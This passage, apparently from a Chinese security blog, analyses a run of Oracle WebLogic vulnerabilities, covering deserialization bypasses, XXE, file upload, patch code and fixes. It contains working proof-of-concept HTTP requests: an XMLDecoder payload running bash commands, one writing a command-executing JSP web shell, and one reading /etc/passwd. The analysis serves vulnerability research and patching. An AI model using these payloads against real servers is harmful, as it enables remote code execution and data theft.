validate方法里，判断开始标签是不是object，是的话直接抛出异常。我们payload中并没有用到object标签，因为我们用的poc就是接下来的10271的，原本3506的poc是会带有object标签的。

## CVE-2017-10271

### 分析

这个漏洞就是上一个漏洞CVE-2017-3506的绕过，因为限制了object标签，所以说可以使用void标签代替来绕过。

    
    
    POST /wls-wsat/CoordinatorPortType HTTP/1.1  
    Host: 172.21.65.112:7001  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
    Connection: close  
    Upgrade-Insecure-Requests: 1  
    Cache-Control: max-age=0  
    Content-Length: 824  
    Accept-Encoding: gzip, deflate  
    SOAPAction:  
    Accept: */*  
    User-Agent: Apache-HttpClient/4.1.1 (java 1.5)  
    Connection: keep-alive  
    Content-Type: text/xml  
    ​  
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
    <soapenv:Header>  
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
      <java version="1.8.0_131" class="java.beans.XMLDecoder">  
        <void class="java.lang.ProcessBuilder">  
          <array class="java.lang.String" length="3">  
            <void index="0">  
              <string>/bin/bash</string>  
            </void>  
            <void index="1">  
              <string>-c</string>  
            </void>  
            <void index="2">  
              <string>touch /tmp/CVE-2017-3506</string>  
            </void>  
          </array>  
          <void method="start"/>  
        </void>  
      </java>  
    </work:WorkContext>  
    </soapenv:Header>  
    <soapenv:Body/>  
    </soapenv:Envelope>

不仅执行命令，还可以写文件：

    
    
    POST /wls-wsat/CoordinatorPortType11 HTTP/1.1  
    Host: xxx.xxx.xxx.xxx:7001  
    Pragma: no-cache  
    Cache-Control: no-cache  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Cookie: Hm_lvt_6809c4d9953f5afcfe906ac76fa71351=1630056737; __TOKEN_STR__=GwxrMBdYmhPjzFQjHMkGWZhSCBcKs2ph; PHPSESSID=7cn2h9mrdhgigdb4u5fp9qisjo; ADMINCONSOLESESSION=f1HhhtJG85wZsjZx6gFNDTFBFHTnpx3hJljXPn004pMGYCt7G0T0!-1612411983  
    Connection: close  
    Content-Type: text/xml  
    Content-Length: 611  
    ​  
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
    <soapenv:Header>  
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
    <java>  
                <java version="1.4.0" class="java.beans.XMLDecoder">  
                    <void class="java.io.PrintWriter">  
                        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</string>  
                        <void method="println">  
    ​  
                            <string><![CDATA[<%if("023".equals(request.getParameter("pwd"))){  
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
    int a = -1;  
    byte[] b = new byte[2048];  
    out.print("<pre>");  
    while((a=in.read(b))!=-1){  
    out.println(new String(b));  
    }  
    out.print("</pre>");} %>]]></string></void><void method="close"/>  
    </void>  
    </java>  
    </java>  
    </work:WorkContext>  
    </soapenv:Header>  
    <soapenv:Body/>

### 修复

找了半天，终于在这找到补丁<https://github.com/pssss/CVE-2017-10271>

这里在安装这个补丁的时候会显示补丁冲突：

![1686578835_64872693c6c2fb47523a5.png!small?1686578833864](https://image.3001.net/images/20230612/1686578835_64872693c6c2fb47523a5.png!small?1686578833864)

补丁的安装步骤之前说过，只不过这里需要删除冲突的补丁：

    
    
    ./bsu.sh -remove -patchlist=EJUW -prod_dir=/u01/app/oracle/middleware/wlserver -verbose  
    ./bsu.sh -remove -patchlist=ZLNA -prod_dir=/u01/app/oracle/middleware/wlserver -verbose

打补丁后的代码如下：

    
    
    public void startElement(String uri, StringlocalName, String qName, Attributes attributes) throws SAXException {  
    if(qName.equalsIgnoreCase(“object”)){  
    throw newIllegalStateException(“Invalid element qName:object”);  
    } else if(qName.equalsIgnoreCase(“new”)){  
    throw newIllegalStateException(“Invalid element qName:new”);  
    } else if(qName.equalsIgnoreCase(“method”)){  
    throw newIllegalStateException(“Invalid element qName:method”);  
    } else {  
    if(qName.equalsIgnoreCase(“void”)) {  
    for(int attClass = 0; attClass< attributes.getLength(); ++attClass) {  
    if(!”index”.equalsIgnoreCase(attributes.getQName(attClass))) {  
    throw newIllegalStateException(“Invalid attribute for element void:” +attributes.getQName(attClass));  
    }  
            }  
    }  
        if(qName.equalsIgnoreCase("array")) {  
            String var9 = attributes.getValue("class");  
            if(var9 != null && !var9.equalsIgnoreCase("byte")) {  
                throw new IllegalStateException("The value of class attribute is not valid for array element.");  
            }  
        }  
    }  
    }

在解析元素的开始标签时，若是object、new、method以及void标签带有属性不是index的都抛出异常。

## CVE-2018-2628

### 分析

#### 第一个绕过

依旧使用的是动态代理类来绕过T3协议反序列化的黑名单。在CVE-2017-3248中，代理的接口Registry被封禁，而这次，使用了Activator作为代理的接口，绕过了ServerChannelInputStream的resolveProxyClass方法的拦截。它的InvocationHandler实现为RemoteObjectInvocationHandler，该类处理远程对象的调用，反序列化代理类时，会先反序列化RemoteObjectInvocationHandler，但是它并没有实现readObject方法，而它的父类RemoteObject实现了，在RemoteObject的readObject方法中，会使用底层JRMP向指定的JRMP服务端发起一个连接，而我们可以伪造一个服务端，向客户端返回一个恶意对象，客户端收到这个恶意对象后反序列化造成命令执行。在JDK6下，无法使用CC链，而在JDK7u21下，可以配合CC链造成RCE。

#### 第二个绕过

使用StreamMessageImpl进行二次反序列化，与CVE-2016-0638相同。

之前使用的JDK6的CC链进行命令执行，而在安装CVE-2017-3248的补丁后，commons-collections.jar包升级了版本导致CC链无法使用，由于WebLogic自带commons-fileupload.jar包，所以改用org.apache.commons.fileupload.disk.DiskFileItem类，配合JDK6空字符截断的特性，写入WebShell。而在安装CVE-2017-3248的补丁后，JDK7的CC链依旧可以使用。

### 修复

这里我使用了WebLogic12.1.3的环境和JDK7u21，WebLogic12.1.3使用OPatch安装补丁。

需要在/u01/app/oracle/middleware/OPatch下新建了一个PATCH_TOP目录，然后将补丁zip丢进去。

解压，cd进入补丁目录，输入命令`/u01/app/oracle/middleware/OPatch/opatch apply`。

报如下错误：

![1686578858_648726aa0ea7e2481c777.png!small?1686578856150](https://image.3001.net/images/20230612/1686578858_648726aa0ea7e2481c777.png!small?1686578856150)

`su oracle`后进apply就行了。

查看补丁信息：

    
    
    \u01\app\oracle\middleware\OPatch\opatch lsinventory  
    或者  
    E:\Oracle\Middleware12214\OPatch\opatch lsinventory -jdk %JAVA_HOME%

WeblogicFilterConfig.class中的黑名单多了个UnicastRef，很迷惑的修复。

对于第一个绕过来说，因为反序列化时反序列化的是代理类，然后再反序列化其他类，在反序列化其他类时并不会检测是否在黑名单，所以依旧能攻击成功。

对于第二个绕过来说，StreamMessageImpl并不在黑名单，导致第二个绕过仍然可以使用。

所以说修了等于没修。

    
    
    private static final String[] DEFAULT_BLACKLIST_CLASSES = new String[]{  
    "org.codehaus.groovy.runtime.ConvertedClosure",   
    "org.codehaus.groovy.runtime.ConversionHandler",   
    "org.codehaus.groovy.runtime.MethodClosure",   
    "org.springframework.transaction.support.AbstractPlatformTransactionManager",   
    "sun.rmi.server.UnicastRef"};

## CVE-2018-2893

### 分析

利用StreamMessageImpl造成二次反序列化，第二次反序列化动态代理对象，动态代理对象的InvocationHandler实现为RemoteObjectInvocationHandler，当反序列化该类时会发起JRMP连接，然后伪造JRMP服务端返回一个恶意对象，这个恶意对象使用的是yso的JDK7u21包装的LinkedHashSet，适用于JDK版本小于7u21的环境，当反序列化这个恶意对象（LinkedHashSet）时，造成RCE。

LinkedHashSet反序列化过程如下：

    
    
    LinkedHashSet.readObject()  
    LinkedHashSet.add()  
    ...  
      TemplatesImpl.hashCode() (X)  
    LinkedHashSet.add()  
    ...  
      Proxy(Templates).hashCode() (X)  
        AnnotationInvocationHandler.invoke() (X)  
          AnnotationInvocationHandler.hashCodeImpl() (X)  
            String.hashCode() (0)  
            AnnotationInvocationHandler.memberValueHashCode() (X)  
              TemplatesImpl.hashCode() (X)  
      Proxy(Templates).equals()  
        AnnotationInvocationHandler.invoke()  
          AnnotationInvocationHandler.equalsImpl()  
            Method.invoke()  
              ...  
                TemplatesImpl.getOutputProperties()  
                  TemplatesImpl.newTransformer()  
                    TemplatesImpl.getTransletInstance()  
                      TemplatesImpl.defineTransletClasses()  
                        ClassLoader.defineClass()  
                        Class.newInstance()  
                          ...  
                            MaliciousClass.<clinit>()  
                              ...  
                                Runtime.exec()

使用原生JDK7u21的利用链造成RCE。

### 修复

    
    
    private static final String[] DEFAULT_BLACKLIST_PACKAGES = { "org.apache.commons.collections.functors", "com.sun.org.apache.xalan.internal.xsltc.trax", "javassist", "java.rmi.activation", "sun.rmi.server" };  
    private static final String[] DEFAULT_BLACKLIST_CLASSES = { "org.codehaus.groovy.runtime.ConvertedClosure", "org.codehaus.groovy.runtime.ConversionHandler", "org.codehaus.groovy.runtime.MethodClosure", "org.springframework.transaction.support.AbstractPlatformTransactionManager", "java.rmi.server.UnicastRemoteObject", "java.rmi.server.RemoteObjectInvocationHandler" };

## CVE-2018-2894

### 分析

在两处uri`/ws_utc/begin.do`，`/ws_utc/config.do`处存在未授权文件上传漏洞。

第一处`/ws_utc/config.do`：

![1686578875_648726bb342eb7ff8ac3a.png!small?1686578873478](https://image.3001.net/images/20230612/1686578875_648726bb342eb7ff8ac3a.png!small?1686578873478)

第二处`/ws_utc/begin.do`：

![1686578880_648726c04077997e1647c.png!small?1686578878691](https://image.3001.net/images/20230612/1686578880_648726c04077997e1647c.png!small?1686578878691)

#### /ws_utc/config.do

上传文件，然后抓包：

![1686578885_648726c5c4ee26d02ba43.png!small?1686578884048](https://image.3001.net/images/20230612/1686578885_648726c5c4ee26d02ba43.png!small?1686578884048)

实际访问的URI为/ws_utc/resources/setting/keystore，由SettingResource的editKeyStoreSettingByMultiPart方法处理：

![1686578891_648726cb4af3a3e4de9ff.png!small?1686578889415](https://image.3001.net/images/20230612/1686578891_648726cb4af3a3e4de9ff.png!small?1686578889415)

进入isRequstedByAdmin方法查看：

![1686578896_648726d069eec535ba529.png!small?1686578894506](https://image.3001.net/images/20230612/1686578896_648726d069eec535ba529.png!small?1686578894506)

isRequstedByAdmin方法判断是否是开发模式。所以走else分支：

![1686578900_648726d4aaad7bcb9a407.png!small?1686578898827](https://image.3001.net/images/20230612/1686578900_648726d4aaad7bcb9a407.png!small?1686578898827)

else分支中获取时间戳，然后调用convertFormDataMultiPart方法，如下，传递四个参数，第一个为表单参数、第二个为附件标志位、第三个为存储keyStore文件的路径、第四个为当前时间戳：

![1686578909_648726dd4bcf3ec039dfe.png!small?1686578907387](https://image.3001.net/images/20230612/1686578909_648726dd4bcf3ec039dfe.png!small?1686578907387)

getKeyStorePath方法如下：

![1686578913_648726e1d3456b11f45ad.png!small?1686578912013](https://image.3001.net/images/20230612/1686578913_648726e1d3456b11f45ad.png!small?1686578912013)

获取的路径为tmp/WSTestPageWorkDir/config/keystore，然后进入convertFormDataMultiPart方法：

![1686578918_648726e67caf3d879c337.png!small?1686578917046](https://image.3001.net/images/20230612/1686578918_648726e67caf3d879c337.png!small?1686578917046)

设置存储路径为方法的第三个参数path，同时将filename赋值给临时变量attachName。接着往下看：

  

![1686578923_648726ebe9f53b53f98eb.png!small?1686578922418](https://image.3001.net/images/20230612/1686578923_648726ebe9f53b53f98eb.png!small?1686578922418)

将storePath作为路径、然后使用下划线将fileNamePrefix和attachName拼接，获取完整文件路径：

    
    
    /u01/app/oracle/Domains/ExampleSilentWTDomain/tmp/WSTestPageWorkDir/config/keystore/1683706480629_shell.jsp

fileNamePrefix就是方法传递的第四个参数-时间戳：

![1686578931_648726f393d6b815e761c.png!small?1686578929758](https://image.3001.net/images/20230612/1686578931_648726f393d6b815e761c.png!small?1686578929758)

拼接完之后获取绝对路径，调用saveAttachedFile保存文件。

![1686578936_648726f8ec1393cacfa6e.png!small?1686578935006](https://image.3001.net/images/20230612/1686578936_648726f8ec1393cacfa6e.png!small?1686578935006)

  

#### /ws_utc/begin.do

点击上传文件，然后抓包：

![1686578941_648726fdaf546eb83e05e.png!small?1686578939883](https://image.3001.net/images/20230612/1686578941_648726fdaf546eb83e05e.png!small?1686578939883)

实际访问的URI为`/ws_utc/resources/ws/config/import`，由WebserviceResource的importWsTestConfig方法处理该路由。

![1686578949_64872705019210e2f914e.png!small?1686578947239](https://image.3001.net/images/20230612/1686578949_64872705019210e2f914e.png!small?1686578947239)

调用convertFormDataMultiPart方法，convertFormDataMultiPart方法如下：

![1686578953_648727098c19f6c49db1e.png!small?1686578951950](https://image.3001.net/images/20230612/1686578953_648727098c19f6c49db1e.png!small?1686578951950)

接着调用重载的convertFormDataMultiPart方法：

![1686578958_6487270ea9460058a79eb.png!small?1686578957072](https://image.3001.net/images/20230612/1686578958_6487270ea9460058a79eb.png!small?1686578957072)

fdcd对应如下：

    
    
    Content-Disposition: form-data; name="import_file_name"; filename="shell.jsp"

接下来如下：

![1686578965_64872715b5c3aa14cd2f5.png!small?1686578964378](https://image.3001.net/images/20230612/1686578965_64872715b5c3aa14cd2f5.png!small?1686578964378)

按/RS_Upload_时间戳/文件前缀_文件名的格式将输入流存储到磁盘上的文件。

![1686578972_6487271c57b9c59e9a4ec.png!small?1686578970422](https://image.3001.net/images/20230612/1686578972_6487271c57b9c59e9a4ec.png!small?1686578970422)

![1686578977_648727219f35e598d8021.png!small?1686578975693](https://image.3001.net/images/20230612/1686578977_648727219f35e598d8021.png!small?1686578975693)

虽然文件能上传成功，但是最后在ImportTestCaseAction的execute方法会调用XML解析器解析该文件：

![1686578981_64872725c20ab0368b7fe.png!small?1686578979980](https://image.3001.net/images/20230612/1686578981_64872725c20ab0368b7fe.png!small?1686578979980)

由于我们上传的是jsp文件，XML解析器无法解析就会抛异常；

![1686578988_6487272c7c1a041c64f3f.png!small?1686578986597](https://image.3001.net/images/20230612/1686578988_6487272c7c1a041c64f3f.png!small?1686578986597)

导致返回状态码为500。

![1686578993_64872731074b448d8007e.png!small?1686578991182](https://image.3001.net/images/20230612/1686578993_64872731074b448d8007e.png!small?1686578991182)

![1686578997_648727358d2e180d81677.png!small?1686578996215](https://image.3001.net/images/20230612/1686578997_648727358d2e180d81677.png!small?1686578996215)

### 小结

/ws_utc/config.do将文件保存在了工作目录的/config/keystore下，同时文件名的格式为：时间戳_自定义文件名的格式。

    
    
    /config/keystore/1683706480629_shell.jsp

/ws_utc/begin.do将文件保存在了工作目录的/upload下（没有则创建），然后会自动生成一层子目录，格式为RS_Upload_时间戳，然后使用_作为分隔符将import_file_name字符串和自定义文件名进行拼接。

    
    
    /upload/RS_Upload_2023-05-10_08-01-42_446/import_file_name_shell.jsp

由于路径标准化不严格且使用getAbsolutePath获取最终的绝对路径：

![1686579006_6487273e6885992bbcf80.png!small?1686579004556](https://image.3001.net/images/20230612/1686579006_6487273e6885992bbcf80.png!small?1686579004556)

所以可以使用/../进行目录穿越。

在config.do下还可以设置工作目录：

![1686579010_64872742ced45baebdff2.png!small?1686579008908](https://image.3001.net/images/20230612/1686579010_64872742ced45baebdff2.png!small?1686579008908)

默认的工作目录为：

    
    
    /u01/app/oracle/Domains/ExampleSilentWTDomain/tmp/WSTestPageWorkDir

## CVE-2018-3191

### 分析

分类：JNDI注入；

T3反序列化漏洞，这次同样是找的绕过黑名单的类，使用的是JtaTransactionManager类，该类在/u01/app/oracle/middleware/wlserver/modules/com.bea.core.repackaged.springframework.spring_1.5.0.0_2-5-3.jar中，反序列化入口点如下：

![1686579015_64872747ac8dd7d9e026a.png!small?1686579013855](https://image.3001.net/images/20230612/1686579015_64872747ac8dd7d9e026a.png!small?1686579013855)

进入initUserTransactionAndTransactionManager方法查看：

![1686579019_6487274b48454a5a5bf65.png!small?1686579017556](https://image.3001.net/images/20230612/1686579019_6487274b48454a5a5bf65.png!small?1686579017556)

若userTransaction为null，则判断userTransactionName是否有值，有值的话调用lookupUserTransaction方法，同时将userTransactionName传递。

![1686579023_6487274f923eb1fda809b.png!small?1686579021997](https://image.3001.net/images/20230612/1686579023_6487274f923eb1fda809b.png!small?1686579021997)

发起JNDI连接，使用可控的userTransactionName作为URL。造成JNDI注入。

## CVE-2018-3245

### 分析

该漏洞是对CVE-2018-2893补丁的绕过，补丁封禁了RemoteObjectInvocationHandler，由于反序列化造成JRMP连接的是RemoteObject，所以只需要寻找RemoteObject的子类即可，且该子类未实现readObject方法。

该CVE-2018-3245使用的是RMIConnectionImpl_Stub，该类的继承图如下：

![1686579033_6487275951f04ddaec7f4.png!small?1686579031371](https://image.3001.net/images/20230612/1686579033_6487275951f04ddaec7f4.png!small?1686579031371)

  

RMIConnectionImpl_Stub的父类RemoteStub也未实现readObject，所以反序列化就交给了RemoteObject，在RemoteObject反序列化时发起JRMP连接，配合JDK7u21链实现RCE。

## CVE-2018-3246

### 分析

该漏洞基于CVE-2018-2894的一个上传文件点：/ws_utc/begin.do，由于JDK6和JDK7默认会解析外部实体，所以可以通过上传XML文件，导致外部实体注入。

之前说过该URI会将文件保存到磁盘上，然后再使用SAXUnmarshaller解析该文件。

![1686579040_64872760de06d12fe8b55.png!small?1686579039259](https://image.3001.net/images/20230612/1686579040_64872760de06d12fe8b55.png!small?1686579039259)

后续来到RegistryXMLReader的parse，如下：

![1686579045_648727659f414fdffe598.png!small?1686579043957](https://image.3001.net/images/20230612/1686579045_648727659f414fdffe598.png!small?1686579043957)

设置ContentHandler、ErrorHandler、DTDHandler。

ContentHandler负责处理文档的开始结束事件、XML元素的开始结束事件、可忽略的实体事件、名称空间前缀映射开始和结束事件、指令事件、字符数据和可忽略的空格事件。

ErrorHandler处理XML文档解析时产生的错误。

DTDHandler处理对文档DTD进行解析时产生的相应事件。

并没有使用XMLDecoder将XML元素转换成java实例，所以无法通过XML内容直接RCE。

## CVE-2018-3252

### 分析

漏洞POC如下（源自pyn3rd）：

    
    
    POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1  
    Host: 127.0.0.1:7001  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8  
    Upgrade-Insecure-Requests: 1  
    wl_request_type: data_transfer_request  
    username: weblogic  
    password: weblogic  
    serverName: pyn3rd  
    deployment_request_id: 1  
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36 QQBrowser/4.1.4132.400  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.8  
    Connection: close  
    Content-Length: 3334  
    ​  
    JDK7u21链的恶意对象字节码

找到处理该URI的Servlet为DeploymentServiceServlet，先经过doPost方法：

![1686579054_6487276e5639035c0714d.png!small?1686579052548](https://image.3001.net/images/20230612/1686579054_6487276e5639035c0714d.png!small?1686579052548)

调用authenticateRequest方法进行认证，然后调用internalDoPost方法。

![1686579059_648727737c8be57f94ecd.png!small?1686579057934](https://image.3001.net/images/20230612/1686579059_648727737c8be57f94ecd.png!small?1686579057934)

获取请求头信息，根据类别分别进入不同的处理方法。这里进入handleDataTransferRequest方法：

![1686579064_64872778df35006158613.png!small?1686579063185](https://image.3001.net/images/20230612/1686579064_64872778df35006158613.png!small?1686579063185)

在handleDataTransferRequest方法中，创建了一个DeploymentObjectInputStream对象，同时通过req.getInputStream方法将请求体作为输入流，供DeploymentObjectInputStream反序列化。

DeploymentObjectInputStream的继承关系如下：

![1686579070_6487277e2d9871fa9ba7c.png!small?1686579068306](https://image.3001.net/images/20230612/1686579070_6487277e2d9871fa9ba7c.png!small?1686579068306)

DeploymentObjectInputStream和父类WLObjectInputStream未作任何安全检查，也未使用黑名单过滤。

所以使用URI：/bea_wls_deployment_internal/DeploymentService，同时控制请求头wl_request_type为
data_transfer_request，那么他就会反序列化请求体的内容，请求体的内容设置为JDK7u21链恶意对象的字节码即可完成RCE。

## CVE-2019-2615

### 分析

该漏洞造成任意文件读取，POC如下：

    
    
    GET http://localhost:7001/bea_wls_management_internal2/wl_management  
    adminPath: /etc/passwd  
    username: weblogic  
    password: qaxateam01  
    wl_request_type: wl_jsp_refresh_request

URI为/bea_wls_management_internal2/wl_management，找到Servlet为FileDistributionServlet：

![1686579076_64872784c40e4408ed38f.png!small?1686579074884](https://image.3001.net/images/20230612/1686579076_64872784c40e4408ed38f.png!small?1686579074884)

由doGet方法处理GET请求：

![1686579081_64872789408a11e331861.png!small?1686579079588](https://image.3001.net/images/20230612/1686579081_64872789408a11e331861.png!small?1686579079588)

判断用户身份，然后获取wl_request_type请求头的值，然后根据不同的值进行不同的处理，当值为wl_jsp_refresh_request时，进入doGetJspRefreshRequest方法：

![1686579086_6487278e7218094ab7af2.png!small?1686579084672](https://image.3001.net/images/20230612/1686579086_6487278e7218094ab7af2.png!small?1686579084672)

将请求头adminPath的值作为文件路径，然后读取文件内容，输出到响应体中，造成任意文件读取。

### 修复

补丁代码直接删除了requestType的“wl_jsp_refresh_request”参数的判断，同时也删除了doGetJspRefreshRequest()方法。

## CVE-2019-2618

### 分析

与CVE-2018-3252的URI相同，都是/bea_wls_deployment_internal/DeploymentService，只不过这次请求头wl_request_type不为data_transfer_request，而是app_upload。

![1686579092_6487279463780b88fda91.png!small?1686579090770](https://image.3001.net/images/20230612/1686579092_6487279463780b88fda91.png!small?1686579090770)

进入handlePlanOrApplicationUpload方法：

![1686579097_64872799ade5b6571e1ac.png!small?1686579095898](https://image.3001.net/images/20230612/1686579097_64872799ade5b6571e1ac.png!small?1686579095898)

然后进入doUploadFile方法：

![1686579102_6487279ef3ed3a31ef34b.png!small?1686579101257](https://image.3001.net/images/20230612/1686579102_6487279ef3ed3a31ef34b.png!small?1686579101257)

这里使用commons-fileupload库解析请求，上传文件。

## 分割线

以下CVE-2019-2647、CVE-2019-2648、CVE-2019-2649、CVE-2019-2650、CVE-2019-2888均为T3协议反序列化漏洞造成的XXE，他们分别使用到了绕过黑名的类ForeignRecoveryContext、WsrmServerPayloadContext、UnknownMsgHeader、WsrmSequenceContext、EJBTaglibDescriptor。而且都是调用readExternal作为入口点。

## CVE-2019-2647

### 分析

T3协议反序列化漏洞造成XXE。

位于ForeignRecoveryContext的readExternal方法：

![1686579111_648727a736640f2439c11.png!small?1686579109503](https://image.3001.net/images/20230612/1686579111_648727a736640f2439c11.png!small?1686579109503)

进入readFrom方法：

![1686579115_648727ab890af8c0bcf55.png!small?1686579113674](https://image.3001.net/images/20230612/1686579115_648727ab890af8c0bcf55.png!small?1686579113674)

调用readEndpointReference方法：

![1686579121_648727b12eaad7e796613.png!small?1686579119367](https://image.3001.net/images/20230612/1686579121_648727b12eaad7e796613.png!small?1686579119367)

未设置外部实体保护，反序列化XML内容造成XXE。

## CVE-2019-2648

### 分析

T3反序列化造成XXE。

这次位于WsrmServerPayloadContext的readExternal方法：

![1686579126_648727b6a7c4598bc37c9.png!small?1686579124737](https://image.3001.net/images/20230612/1686579126_648727b6a7c4598bc37c9.png!small?1686579124737)

这里的size是XML内容的字节大小，接着调用readEndpt方法：

![1686579130_648727ba9adccd5eed4f0.png!small?1686579128921](https://image.3001.net/images/20230612/1686579130_648727ba9adccd5eed4f0.png!small?1686579128921)

先创建一个字节数组，然后读取输入流中的XML内容，然后调用DocumentBuilder解析XML，未开启外部实体保护，造成XXE。

## CVE-2019-2649

### 分析

T3协议造成XXE。

这次发生在UnknownMsgHeader的readExternal方法中：

![1686579137_648727c116ac6ed399995.png!small?1686579135526](https://image.3001.net/images/20230612/1686579137_648727c116ac6ed399995.png!small?1686579135526)

输入流读取一个size，然后根据这个size创建一个字节数组，然后从输入流中将XML内容读取到这个字节数组，然后将这个字节数组b包装成字节输入流stream，然后调用DocumentBuilder解析该XML字节输入流，未开启外部实体保护，造成XXE。

## CVE-2019-2650

### 分析

T3协议反序列化造成XXE。

这次发生在WsrmSequenceContext的readExternal中：

![1686579143_648727c700ea82e7cc4d7.png!small?1686579141443](https://image.3001.net/images/20230612/1686579143_648727c700ea82e7cc4d7.png!small?1686579141443)

然后调用readEndpt方法：

![1686579147_648727cb734a029a3d770.png!small?1686579145854](https://image.3001.net/images/20230612/1686579147_648727cb734a029a3d770.png!small?1686579145854)

同样，也是从流中读取XML内容，然后在未开启实体保护的情况下解析XML内容造成XXE。

## CVE-2019-2888

### 分析

T3协议反序列化造成XXE。

这次发生在EJBTaglibDescriptor的readExternal方法中：

![1686579155_648727d32e268a2363cdd.png!small?1686579153297](https://image.3001.net/images/20230612/1686579155_648727d32e268a2363cdd.png!small?1686579153297)

先读取XML内容，然后调用load方法，将XML内容传入，load方法如下：

![1686579167_648727df4b6a7d6ba2dfb.png!small?1686579165522](https://image.3001.net/images/20230612/1686579167_648727df4b6a7d6ba2dfb.png!small?1686579165522)

这里也是在未开启外部实体保护的情况下使用DocumentBuilder解析XML内容造成XXE。

## CVE-2019-2725

### 分析

利用XMLDecoder反序列化，同时XML标签绕过了CVE-2017-10271的补丁限制，然后反序列化成功UnitOfWorkChangeSet类，在该类的构造函数中调用了readObject方法将第一个方法参数进行读取，造成二次反序列化漏洞。

POC如下：

    
    
    <?xml version="1.0" encoding="utf-8"?>  
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
    <soapenv:Header>  
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
          <java>  
              <class>  
                  <string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet  
                  </string>  
                  <void>  
                      <array class="byte" length="8970">  
                      <void index="0">  
                          <byte>-84</byte>  
                      ...  
                      ...  
                      </array>  
    </void>  
    </class>  
          </java>  
      </work:WorkContext>  
    </soapenv:Header>  
    <soapenv:Body/>  
    </soapenv:Envelope>

CVE-2017-10271使用的URI为/wls-wsat/CoordinatorPortType，而这次的URI为/_async/AsyncResponseService，同时由于URI不同，导致处理的入口点不同，CVE-2017-10271，入口点为WorkContextServerTube#processRequest，而该CVE-2019-2725为BaseWSServlet#service。

调用链如下：

![1686579176_648727e8a12e3e621ef67.png!small?1686579174739](https://image.3001.net/images/20230612/1686579176_648727e8a12e3e621ef67.png!small?1686579174739)

利用链从WorkContextLocalMap的receiveRequest开始与CVE-2017-10271相同。

这里从处理的入口点开始分析BaseWSServlet#service：

![1686579180_648727ecd0f10b10b6663.png!small?1686579179318](https://image.3001.net/images/20230612/1686579180_648727ecd0f10b10b6663.png!small?1686579179318)

service方法上半部分如上图，下半部分如下图：

![1686579190_648727f661c01084f17d4.png!small?1686579188616](https://image.3001.net/images/20230612/1686579190_648727f661c01084f17d4.png!small?1686579188616)

进入run方法：

![1686579196_648727fcf29b178866ea8.png!small?1686579195144](https://image.3001.net/images/20230612/1686579196_648727fcf29b178866ea8.png!small?1686579195144)

![1686579202_648728025d5e73ca36b50.png!small?1686579200519](https://image.3001.net/images/20230612/1686579202_648728025d5e73ca36b50.png!small?1686579200519)

循环获取每个处理器，处理请求，第一个处理器为SoapProcessor，进入SoapProcessor的process方法：

![1686579207_64872807caf98db33811e.png!small?1686579205975](https://image.3001.net/images/20230612/1686579207_64872807caf98db33811e.png!small?1686579205975)

调用handlePost处理POST请求，进入handlePost方法查看：

![1686579213_6487280d42e38c89cc31b.png!small?1686579211731](https://image.3001.net/images/20230612/1686579213_6487280d42e38c89cc31b.png!small?1686579211731)

port变量为WsPortImpl：

![1686579218_6487281216c63a8efa41d.png!small?1686579216101](https://image.3001.net/images/20230612/1686579218_6487281216c63a8efa41d.png!small?1686579216101)

WSDL Port，它是WSDL（Web Services Description Language，Web服务描述语言）文件中定义的一个元素。

WSDL Port元素包含了以下信息：

  1. 名称（name）：指定该port名字；

  2. Web服务的网络地址（location）信息，用于指定Web服务实际运行的地址；

  3. Web服务的绑定（binding）信息，用于指定绑定使用的SOAP协议版本、消息编码格式、传输协议等信息。

WsSkel是Web服务的一个概念，它是指Web服务的Skeleton（骨架）代码。在Web服务的开发过程中，开发人员通常需要编写Web服务的实现代码和Skeleton代码。

Skeleton代码是Web服务的框架代码，它负责接收SOAP消息，并将消息传递给Web服务的实现代码进行处理。在Java语言中，Skeleton代码通常由Java
API for XML-Based Web Services (JAX-WS) 自动生成，开发人员无需手动编写Skeleton代码。

WsSkel通常包含以下功能：

  1. 解析SOAP消息：WsSkel负责解析SOAP消息，并将消息转换为Java对象，以便在Web服务的实现代码中进行处理。

  2. 调用Web服务实现代码：WsSkel将解析得到的Java对象传递给Web服务实现代码进行处理，然后将处理结果封装为SOAP消息返回给客户端。

  3. 处理SOAP Fault：如果Web服务发生异常，WsSkel将捕获异常并将其封装为SOAP Fault消息返回给客户端。

WsSkel是Web服务的重要组成部分之一，它使得Web服务的开发变得更加简单和高效。开发人员可以专注于Web服务的实现代码，而无需关注底层的SOAP消息处理细节。

然后进入invoke方法：

![1686579225_64872819310bd06d607b5.png!small?1686579223678](https://image.3001.net/images/20230612/1686579225_64872819310bd06d607b5.png!small?1686579223678)

设置线程classloader，然后绑定port和connection到dispatcher，然后调用dispatch方法：

![1686579228_6487281c9e94986471383.png!small?1686579226703](https://image.3001.net/images/20230612/1686579228_6487281c9e94986471383.png!small?1686579226703)

